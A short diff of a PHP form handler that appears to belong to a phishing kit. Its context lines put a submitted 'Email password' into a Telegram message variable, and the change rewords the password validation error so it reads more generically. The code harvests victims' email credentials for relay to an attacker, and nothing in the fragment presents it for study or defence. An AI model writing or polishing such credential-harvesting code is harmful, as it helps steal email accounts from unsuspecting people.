@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $telegramMessage .= "Email password: $email_pass\n";
     }
     if (($email_pass == '') or (strlen($email_pass) <= 6)) {
-        array_push($data_error, "Email password field is not correct");
+        array_push($data_error, "Password field is not correct");
     }
     if (count($data_error) != 0) {
         http_response_code(200);
